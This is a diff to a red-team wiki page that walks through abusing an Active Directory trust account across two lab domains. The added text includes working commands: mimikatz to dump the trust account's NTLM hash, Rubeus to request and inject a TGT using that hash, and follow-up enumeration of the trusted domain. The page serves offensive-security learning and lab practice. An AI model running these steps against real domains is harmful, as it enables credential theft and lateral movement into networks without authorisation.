@@ -23,14 +23,73 @@ This technique is possible, because once a trust relationship between domains is
 
 In our situation, considering that `first.local` is a trusted domain trusted by the trusting domain second.local, the trust account `first.local\second$` (user account `second$` in the domain `first.local`) will be created.&#x20;
 
-`first.local\second$` is the account we want to and CAN compromise if we have domain admin privileges on `second.local`.
+`first.local\second$` is the account we want to and CAN compromise from second.local, assuming we have domain admin privileges on `second.local`.
 
-## Walkthrough
+## Checks
 
-Let's check some of the things we touched on in the overview.
+Let's check some of the things we touched on in the overview.&#x20;
+
+Confirm the trust relationships between domains:
 
 ```
+# on first-dc.first.local
 get-adtrust -filter *
+```
+
+```
+# on second-dc.second.local
+get-adtrust -filter *
+```
+
+Confirm that there's a trust account `second$` on `first.local` domain:
+
+```
+# on first-dc.first.local
+get-aduser 'second$'
+```
+
+Confirm that we can enumerate resources on the trusting domain second.local from first.local:
+
+```
+# from first-dc.first.local
+get-aduser -Filter * -Server second.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
+```
+
+Confirm that we cannot enumerate resources on the trusted domain first.local from the trusting domain second.local:
+
+```
+# on second-dc.second.local
+get-aduser -Filter * -Server first.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
+```
+
+## Compromising Trust Account first.local\second$
+
+As mentioned earlier, the main crux of the technique is that we're able to compromise the trust account `first.local\second$` if we have domain admin access on `second.local`.
+
+To compromise the `first.local\second$` and reveal its password hash, we can use mimikatz like so:
+
+```
+# on second-dc.second.local
+mimikatz.exe "lsadump::trust /patch" "exit"
+```
+
+Note the RC4 hash in \[out] first.local -> second.local line - this is the NTLM hash for `first.local\second$`, capture it.
+
+## Requesting TGT for first.local\second$
+
+Once we have the NTLM hash for `first.local\second$`, we can request its TGT from `first.local`:
+
+```
+#on second-dc.second.local
+Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
+```
+
+## Accessing Resources on First.local from Second.local
+
+At this point on `second-dc.second.local`, we have a TGT for `first.local\second$` committed to memory and we can now start enumerating resources on `first.local`:
+
+```
+Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprincipalnames
 ```
 
 ## References
